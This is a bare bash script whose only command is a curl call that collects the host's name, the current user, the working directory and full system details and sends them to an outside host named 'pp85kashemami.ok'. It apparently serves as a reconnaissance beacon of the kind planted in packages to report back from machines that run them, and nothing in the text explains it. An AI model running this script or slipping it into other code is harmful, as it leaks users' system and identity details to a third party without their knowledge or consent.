#!/bin/bash

curl -H "Hostname: $(hostname)" -H "Whoami: $(whoami)" -H "Pwd: $(pwd)" -H "uname-a: $(uname -a)" -d $(uname)  http://pp85kashemami.ok
